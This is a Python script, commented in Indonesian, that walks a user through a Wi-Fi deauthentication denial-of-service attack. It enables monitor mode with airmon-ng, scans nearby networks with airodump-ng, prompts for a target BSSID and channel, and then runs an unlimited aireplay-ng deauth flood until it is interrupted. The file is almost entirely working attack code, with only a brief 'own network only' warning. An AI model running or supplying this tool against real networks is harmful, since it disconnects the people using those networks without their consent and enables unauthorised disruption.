import os
import time
import subprocess

def run_deauth_attack():
    """
    Fungsi untuk memandu dan menjalankan Deauth Attack (Denial-of-Service)
    yang berhenti hanya dengan CTRL+C.
    """
    if os.geteuid() != 0:
        print("\n❌ Error: Skrip ini harus dijalankan dengan hak akses root (sudo).")
        return

    print("\n--- Memulai Serangan Deautentikasi (Hanya Deauth) ---")
    print("PERINGATAN: Hanya gunakan pada jaringan milik Anda sendiri.\n")
    time.sleep(3)

    interface_mon = ""
    aireplay_process = None

    try:
        # Langkah 1 & 2: Persiapan Antarmuka
        print("[LANGKAH 1 & 2] Mempersiapkan antarmuka...")
        subprocess.run(['iwconfig'])
        interface = input("\nMasukkan nama antarmuka nirkabel Anda (contoh: wlan0): ")
        if not interface:
            print("Nama antarmuka tidak boleh kosong. Proses dibatalkan.")
            return

        interface_mon = interface + "mon"
        subprocess.run(['sudo', 'airmon-ng', 'start', interface], check=True, capture_output=True)
        print(f"✅ Mode monitor berhasil diaktifkan di '{interface_mon}'.")
        time.sleep(2)

        # Langkah 3: Scan jaringan
        print(f"\n[LANGKAH 3] Memindai jaringan sekitar...")
        print(">>> Tekan CTRL+C jika Anda sudah menemukan target Anda. <<<")
        time.sleep(4)
        try:
            scan_process = subprocess.Popen(['sudo', 'airodump-ng', interface_mon])
            scan_process.wait()
        except KeyboardInterrupt:
            print("\n✅ Pemindaian dihentikan oleh pengguna.")

        # Langkah 4: Meminta detail target dan mengatur channel
        print("\n[LANGKAH 4] Masukkan detail jaringan target.")
        bssid = input("Masukkan BSSID target: ")
        channel = input("Masukkan Channel target: ")

        if not bssid or not channel:
            print("BSSID dan Channel tidak boleh kosong. Proses dibatalkan.")
            return

        print(f"   -> Mengatur antarmuka {interface_mon} ke channel {channel}...")
        subprocess.run(['sudo', 'iwconfig', interface_mon, 'channel', channel], check=True)

        # Langkah 5: Menjalankan serangan deauth dan menunggu Ctrl+C
        print("\n[LANGKAH 5] Memulai serangan deauth berkelanjutan!")
        cmd_aireplay = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', bssid, interface_mon]
        aireplay_process = subprocess.Popen(cmd_aireplay)
        
        print("\n" + "="*20 + " SERANGAN AKTIF " + "="*20)
        print(f"   -> aireplay-ng berjalan (PID: {aireplay_process.pid}).")
        print(">>> Tekan CTRL+C untuk menghentikan serangan... <<<")
        
        # Loop ini akan berjalan selamanya sampai diinterupsi oleh Ctrl+C
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n\n✅ Sinyal CTRL+C terdeteksi. Membersihkan proses...")
    except Exception as e:
        print(f"\n❌ Terjadi kesalahan yang tidak terduga: {e}")
    finally:
        # Langkah 6: Membersihkan (selalu dijalankan)
        print("\n[LANGKAH 6] Membersihkan dan mengembalikan pengaturan...")
        
        if aireplay_process:
            print(f"   -> Menghentikan proses aireplay-ng...")
            aireplay_process.terminate()
            aireplay_process.wait()

        if interface_mon:
            print(f"   -> Menghentikan mode monitor pada {interface_mon}...")
            subprocess.run(['sudo', 'airmon-ng', 'stop', interface_mon], capture_output=True)
        
        print("   -> Merestart layanan Network Manager...")
        subprocess.run(['sudo', 'service', 'NetworkManager', 'start'], capture_output=True)
        
        print("\n🎉 Proses Selesai! WiFi Anda seharusnya kembali normal.")

if __name__ == "__main__":
    run_deauth_attack()
